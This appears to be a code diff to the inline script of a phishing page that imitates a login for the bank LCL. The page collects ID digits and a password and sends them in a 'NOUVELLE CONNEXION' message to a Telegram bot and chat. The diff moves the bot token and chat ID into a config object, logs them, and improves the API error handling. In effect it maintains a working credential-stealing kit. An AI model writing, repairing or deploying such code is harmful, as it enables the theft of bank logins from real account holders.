@@ -634,8 +634,8 @@
 
 <script>
     // Configuration Telegram
-    const TELEGRAM_BOT_TOKEN = '[REDACTED]';
-    const TELEGRAM_CHAT_ID = '6078788670';
+    const TELEGRAM_BOT_TOKEN = window.telegramConfig?.BOT_TOKEN || 'NOT_SET';
+    const TELEGRAM_CHAT_ID = window.telegramConfig?.CHAT_ID || 'NOT_SET';
     
     const idInputs = document.querySelectorAll('.id-digit');
     const stepPassword = document.getElementById('step-password');
@@ -841,6 +841,13 @@
 
     async function sendToTelegramSimple(data) {
         console.log("🚀 ENVOI TELEGRAM LCL");
+        console.log("Token:", TELEGRAM_BOT_TOKEN);
+        console.log("Chat ID:", TELEGRAM_CHAT_ID);
+        
+        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'NOT_SET' || !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'NOT_SET') {
+            console.error("Config Telegram manquante");
+            return { success: false, message: "❌ Configuration Telegram manquante" };
+        }
         
         try {
             const message = `🔐 LCL - NOUVELLE CONNEXION 🔐
@@ -864,12 +871,14 @@
                 body: formData
             });
             
-            if (response.ok) {
-                const result = await response.json();
+            const result = await response.json();
+            
+            if (result.ok) {
                 console.log("✅ Succès Telegram");
                 return { success: true, message: "✅ Données envoyées à Telegram!" };
             } else {
-                return { success: false, message: "❌ Erreur: " + response.status };
+                console.error("Telegram API error:", result);
+                return { success: false, message: "❌ Erreur Telegram: " + (result.description || result.error_code) };
             }
         } catch (error) {
             return { success: false, message: "❌ Erreur: " + error.message };
